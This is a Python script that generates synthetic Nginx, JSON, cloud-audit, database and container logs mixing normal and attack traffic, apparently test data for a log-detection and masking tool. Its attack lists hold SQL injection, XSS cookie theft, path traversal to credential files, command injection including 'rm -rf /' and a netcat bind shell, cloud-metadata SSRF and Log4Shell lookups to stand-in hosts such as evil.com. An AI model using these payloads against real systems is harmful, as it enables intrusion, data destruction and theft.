#!/usr/bin/env python3
import random
import json
import gzip
import os
from datetime import datetime, timedelta
from typing import List, Dict, Any, Optional
import string
import hashlib
import argparse

class LogGenerator:
    def __init__(self, seed: Optional[int] = None):
        if seed is not None:
            random.seed(seed)
        self.seed = seed

    def generate_ip(self) -> str:
        """Generate random IP address"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def generate_private_ip(self) -> str:
        """Generate private IP address"""
        ranges = [
            (10, random.randint(0, 255), random.randint(0, 255), random.randint(1, 254)),
            (192, 168, random.randint(0, 255), random.randint(1, 254)),
            (172, random.randint(16, 31), random.randint(0, 255), random.randint(1, 254))
        ]
        chosen = random.choice(ranges)
        return f"{chosen[0]}.{chosen[1]}.{chosen[2]}.{chosen[3]}"

    def generate_user_agent(self) -> str:
        """Generate random user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "curl/7.68.0",
            "python-requests/2.25.1",
            "PostmanRuntime/7.28.0"
        ]
        return random.choice(user_agents)

    def generate_email(self) -> str:
        """Generate random email address"""
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 15)))
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'company.com', 'example.org']
        return f"{username}@{random.choice(domains)}"

    def generate_phone(self) -> str:
        """Generate random Chinese phone number"""
        return f"1{random.choice([3, 5, 7, 8, 9])}{random.randint(0, 9)}{random.randint(10000000, 99999999)}"

    def generate_id_card(self) -> str:
        """Generate random Chinese ID card number"""
        # Simplified ID card generation
        region = random.randint(110000, 659004)
        birth = datetime(1950, 1, 1) + timedelta(days=random.randint(0, 20000))
        sequence = random.randint(100, 999)
        base = f"{region}{birth.strftime('%Y%m%d')}{sequence}"
        # Simple checksum
        checksum = 0
        weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        for i, char in enumerate(base):
            checksum += int(char) * weights[i]
        check_codes = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        return base + check_codes[checksum % 11]

    def generate_credit_card(self) -> str:
        """Generate random credit card number"""
        # Visa format
        prefix = '4'
        number = prefix + ''.join([str(random.randint(0, 9)) for _ in range(14)])
        # Luhn checksum (simplified)
        return number

    def generate_api_key(self) -> str:
        """Generate random API key"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

    def encode_obfuscation(self, text: str, methods: List[str]) -> str:
        """Apply various encoding obfuscation methods"""
        result = text

        for method in methods:
            if method == 'url_encode':
                result = result.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E').replace('=', '%3D')
            elif method == 'hex_encode':
                result = result.encode('utf-8').hex()
            elif method == 'base64_encode':
                import base64
                result = base64.b64encode(result.encode('utf-8')).decode('utf-8')
            elif method == 'mixed_case':
                result = ''.join([c.upper() if random.random() > 0.5 else c.lower() for c in result])
            elif method == 'comment_insertion':
                if 'SELECT' in result:
                    result = result.replace('SELECT', 'SEL/**/ECT')
                elif 'union' in result:
                    result = result.replace('union', 'un/**/ion')

        return result

    def generate_nginx_log(self, attack_type: Optional[str] = None) -> str:
        """Generate Nginx access log"""
        ip = self.generate_ip()
        timestamp = datetime.now() - timedelta(seconds=random.randint(0, 3600))
        user_agent = self.generate_user_agent()

        # Generate normal or malicious request
        if attack_type is None:
            # Normal traffic
            methods = ['GET', 'POST', 'PUT', 'DELETE']
            paths = ['/', '/index.html', '/login', '/dashboard', '/api/users', '/static/css/style.css']
            statuses = [200, 201, 302, 404]
        else:
            # Attack traffic
            methods = ['GET', 'POST']
            statuses = [200, 403, 500]
            paths = self.generate_attack_path(attack_type)

        method = random.choice(methods)
        path = random.choice(paths)
        status = random.choice(statuses)
        referer = "-" if random.random() > 0.3 else "https://example.com"
        size = random.randint(100, 50000)

        return f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{method} {path} HTTP/1.1" {status} {size} "{referer}" "{user_agent}"'

    def generate_attack_path(self, attack_type: str) -> List[str]:
        """Generate attack paths based on type"""
        attacks = {
            'sqli': [
                "/search?q=' OR '1'='1",
                "/user?id=1 UNION SELECT username,password FROM users",
                "/login?email=' OR 1=1--",
                "/api/data?id=1; DROP TABLE users--",
                "/search?q=admin'--",
                "/user/profile?id=1%20AND%201=1",
                "/api/query?sql=SELECT%20*%20FROM%20users"
            ],
            'xss': [
                "/search?q=<script>alert('XSS')</script>",
                "/comment?text=<img src=x onerror=alert(1)>",
                "/profile?name=<svg onload=alert(document.cookie)>",
                "/search?q=javascript:alert('XSS')",
                "/post?content=<iframe src=javascript:alert('XSS')>",
                "/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
            ],
            'path_traversal': [
                "/file?name=../../../etc/passwd",
                "/download?file=..%2F..%2F..%2Fwindows%2Fsystem32%2Fconfig%2Fsam",
                "/static?css=..%2F..%2F..%2Fetc%2Fshadow",
                "/include?file=..\\..\\..\\boot.ini",
                "/config?file=../../../../proc/self/environ"
            ],
            'command_injection': [
                "/ping?ip=127.0.0.1; cat /etc/passwd",
                "/exec?cmd=whoami",
                "/lookup?host=$(cat /etc/passwd)",
                "/process?id=1 | rm -rf /",
                "/system?command=nc -l -p 1337 -e /bin/bash"
            ],
            'ssrf': [
                "/fetch?url=http://localhost:8080/admin",
                "/proxy?url=http://169.254.169.254/latest/meta-data/",
                "/load?url=http://127.0.0.1:22",
                "/redirect?url=file:///etc/passwd"
            ],
            'log4shell': [
                "/user?id=${jndi:ldap://evil.com/a}",
                "/search?q=${jndi:rmi://attacker.com/exploit}",
                "/login?user=${jndi:dns://evil.com/poc}"
            ]
        }

        # Add obfuscation
        if attack_type in attacks:
            base_paths = attacks[attack_type]
            obfuscated = []
            for path in base_paths:
                if random.random() > 0.5:  # 50% chance of obfuscation
                    methods = random.sample(['url_encode', 'mixed_case', 'comment_insertion'], k=random.randint(1, 2))
                    path = self.encode_obfuscation(path, methods)
                obfuscated.append(path)
            return obfuscated

        return ["/"]

    def generate_json_log(self, attack_type: Optional[str] = None) -> str:
        """Generate JSON log entry"""
        timestamp = datetime.now() - timedelta(seconds=random.randint(0, 3600))
        log_data = {
            "timestamp": timestamp.isoformat(),
            "level": random.choice(["INFO", "WARN", "ERROR"]),
            "message": "",
            "source_ip": self.generate_ip(),
            "user_agent": self.generate_user_agent(),
            "method": random.choice(["GET", "POST", "PUT", "DELETE"]),
            "path": "/",
            "status": 200,
            "tenant": random.choice(["acme", "techcorp", "finance", "default"])
        }

        if attack_type:
            # Generate attack in JSON format
            attack_messages = {
                'sqli': f"SQL injection attempt: {random.choice(self.generate_attack_path('sqli'))}",
                'xss': f"XSS attempt detected: {random.choice(self.generate_attack_path('xss'))}",
                'path_traversal': f"Path traversal: {random.choice(self.generate_attack_path('path_traversal'))}",
                'command_injection': f"Command injection: {random.choice(self.generate_attack_path('command_injection'))}",
                'ssrf': f"SSRF attempt: {random.choice(self.generate_attack_path('ssrf'))}",
                'log4shell': f"Log4Shell attack: {random.choice(self.generate_attack_path('log4shell'))}"
            }

            log_data.update({
                "level": "ERROR",
                "message": attack_messages.get(attack_type, "Attack detected"),
                "path": random.choice(self.generate_attack_path(attack_type)),
                "status": random.choice([403, 500])
            })
        else:
            # Normal log messages
            normal_messages = [
                "User login successful",
                "API request processed",
                "File uploaded successfully",
                "Database query executed",
                "Cache miss for key"
            ]
            log_data["message"] = random.choice(normal_messages)

        return json.dumps(log_data)

    def generate_cloud_audit_log(self, attack_type: Optional[str] = None) -> str:
        """Generate cloud audit log"""
        timestamp = datetime.now() - timedelta(seconds=random.randint(0, 3600))

        if attack_type:
            # Malicious actions
            malicious_actions = [
                ("DeleteBucket", "s3", "critical"),
                ("CreateAccessKey", "iam", "high"),
                ("ModifySecurityGroups", "ec2", "high"),
                ("AssumeRole", "sts", "medium"),
                ("PutBucketPolicy", "s3", "high"),
                ("UpdateLoginProfile", "iam", "medium")
            ]
            action, resource, severity = random.choice(malicious_actions)
            user = random.choice(["attacker", "hacker", "malicious_user"])
            role = random.choice(["attacker-role", "compromised-role"])
            result = "Failure" if random.random() > 0.3 else "Success"
        else:
            # Normal actions
            normal_actions = [
                ("GetObject", "s3", "info"),
                ("ListBuckets", "s3", "info"),
                ("DescribeInstances", "ec2", "info"),
                ("GetUser", "iam", "info"),
                ("ListRoles", "iam", "info")
            ]
            action, resource, severity = random.choice(normal_actions)
            user = random.choice(["admin", "user", "service-account"])
            role = random.choice(["admin-role", "user-role", "service-role"])
            result = "Success"

        return f"{timestamp.isoformat()} {user} {role} {resource} {action} {result}"

    def generate_database_audit_log(self, attack_type: Optional[str] = None) -> str:
        """Generate database audit log"""
        timestamp = datetime.now() - timedelta(seconds=random.randint(0, 3600))
        user = random.choice(["admin", "app_user", "readonly_user", "attacker"])
        database = random.choice(["production", "staging", "development"])

        if attack_type == 'sqli':
            queries = [
                "SELECT * FROM users WHERE username = 'admin' OR '1'='1'",
                "SELECT username, password FROM credentials UNION SELECT card_number, cvv FROM payments",
                "INSERT INTO users (username, password) VALUES ('attacker', 'hacked')",
                "UPDATE users SET is_admin = 1 WHERE username = 'attacker'",
                "DROP TABLE important_data"
            ]
            operation = "SELECT"
            query = random.choice(queries)
        elif attack_type:
            query = f"Malicious {attack_type} query detected"
            operation = "UNKNOWN"
        else:
            # Normal queries
            normal_queries = [
                "SELECT * FROM users WHERE id = 1",
                "INSERT INTO logs (message, level) VALUES ('test', 'INFO')",
                "UPDATE users SET last_login = NOW() WHERE id = 1",
                "DELETE FROM sessions WHERE expires < NOW()"
            ]
            operation = random.choice(["SELECT", "INSERT", "UPDATE", "DELETE"])
            query = random.choice(normal_queries)

        return f"{timestamp.isoformat()} {user} {database} {operation} {query}"

    def generate_container_log(self, attack_type: Optional[str] = None) -> str:
        """Generate container runtime log"""
        timestamp = datetime.now() - timedelta(seconds=random.randint(0, 3600))
        pod = f"app-{random.randint(1, 100)}-{random.randint(1, 10)}"
        container = random.choice(["web-server", "api", "database", "worker"])

        if attack_type:
            level = "ERROR"
            message = f"Security alert: {attack_type} detected in container {container}"
        else:
            level = random.choice(["INFO", "WARN"])
            messages = [
                "Application started successfully",
                "Health check passed",
                "Processing request",
                "Cache updated",
                "Background job completed"
            ]
            message = random.choice(messages)

        return f"{timestamp.isoformat()} {level} {pod} {container} {message}"

    def generate_sensitive_data_log(self) -> str:
        """Generate log with sensitive data (for testing masking)"""
        data_types = [
            f"User email: {self.generate_email()}",
            f"Phone number: {self.generate_phone()}",
            f"ID card: {self.generate_id_card()}",
            f"Credit card: {self.generate_credit_card()}",
            f"API key: {self.generate_api_key()}",
            f"User info: email={self.generate_email()}, phone={self.generate_phone()}, id={self.generate_id_card()}"
        ]

        log_formats = [
            f"INFO: User registration: {random.choice(data_types)}",
            f"ERROR: Payment failed for card {self.generate_credit_card()}",
            f"WARN: Sensitive data exposure: {random.choice(data_types)}",
            json.dumps({
                "event": "user_data",
                "email": self.generate_email(),
                "phone": self.generate_phone(),
                "api_key": self.generate_api_key(),
                "timestamp": datetime.now().isoformat()
            })
        ]

        return random.choice(log_formats)

    def generate_log_line(self, log_type: str = 'nginx', attack_type: Optional[str] = None) -> str:
        """Generate a single log line of specified type"""
        generators = {
            'nginx': self.generate_nginx_log,
            'json': self.generate_json_log,
            'cloud_audit': self.generate_cloud_audit_log,
            'database_audit': self.generate_database_audit_log,
            'container': self.generate_container_log,
            'sensitive_data': self.generate_sensitive_data_log
        }

        generator = generators.get(log_type, self.generate_nginx_log)
        return generator(attack_type)

    def generate_mixed_logs(self, count: int, attack_ratio: float = 0.1) -> List[str]:
        """Generate mixed normal and attack logs"""
        logs = []
        log_types = ['nginx', 'json', 'cloud_audit', 'database_audit', 'container']
        attack_types = ['sqli', 'xss', 'path_traversal', 'command_injection', 'ssrf', 'log4shell']

        for i in range(count):
            # Determine if this should be an attack
            if random.random() < attack_ratio:
                log_type = random.choice(log_types)
                attack_type = random.choice(attack_types)
            else:
                log_type = random.choice(log_types)
                attack_type = None

            log_line = self.generate_log_line(log_type, attack_type)
            logs.append(log_line)

        return logs

    def generate_session_attack(self) -> List[str]:
        """Generate a session with multiple attacks from same IP"""
        ip = self.generate_ip()
        user_agent = self.generate_user_agent()
        logs = []
        timestamp = datetime.now()

        # Normal requests
        for i in range(5):
            timestamp = timestamp + timedelta(seconds=random.randint(1, 30))
            log = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /page{i}.html HTTP/1.1" 200 1024 "-" "{user_agent}"'
            logs.append(log)

        # Attack sequence
        attack_paths = [
            "/search?q='<script>alert(1)</script>",
            "/user?id=1 OR 1=1",
            "/file?name=../../../etc/passwd",
            "/ping?ip=127.0.0.1; whoami"
        ]

        for i, path in enumerate(attack_paths):
            timestamp = timestamp + timedelta(seconds=random.randint(1, 10))
            log = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" 403 512 "-" "{user_agent}"'
            logs.append(log)

        return logs

    def save_logs(self, logs: List[str], filename: str, compress: bool = False):
        """Save logs to file with optional compression"""
        os.makedirs(os.path.dirname(filename), exist_ok=True)

        if compress and filename.endswith('.gz'):
            with gzip.open(filename, 'wt', encoding='utf-8') as f:
                f.write('\n'.join(logs))
        else:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write('\n'.join(logs))

def main():
    parser = argparse.ArgumentParser(description="Generate sample log data for testing")
    parser.add_argument('--seed', type=int, help='Random seed for reproducible results')
    parser.add_argument('--count', type=int, default=1000, help='Number of log lines to generate')
    parser.add_argument('--attack-ratio', type=float, default=0.1, help='Ratio of attack logs (0.0-1.0)')
    parser.add_argument('--output', default='samples/mixed.log', help='Output file path')
    parser.add_argument('--compress', action='store_true', help='Compress output with gzip')
    parser.add_argument('--session-attack', action='store_true', help='Generate session-based attack scenarios')

    args = parser.parse_args()

    generator = LogGenerator(args.seed)

    if args.session_attack:
        # Generate session attacks
        logs = []
        for _ in range(args.count // 20):  # Each session has ~20 logs
            session_logs = generator.generate_session_attack()
            logs.extend(session_logs)

        # Fill remaining with normal logs
        normal_count = args.count - len(logs)
        if normal_count > 0:
            normal_logs = generator.generate_mixed_logs(normal_count, 0.0)
            logs.extend(normal_logs)
    else:
        # Generate mixed logs
        logs = generator.generate_mixed_logs(args.count, args.attack_ratio)

    # Save logs
    generator.save_logs(logs, args.output, args.compress)

    print(f"Generated {len(logs)} log lines in {args.output}")
    if args.seed:
        print(f"Used seed: {args.seed}")

if __name__ == "__main__":
    main()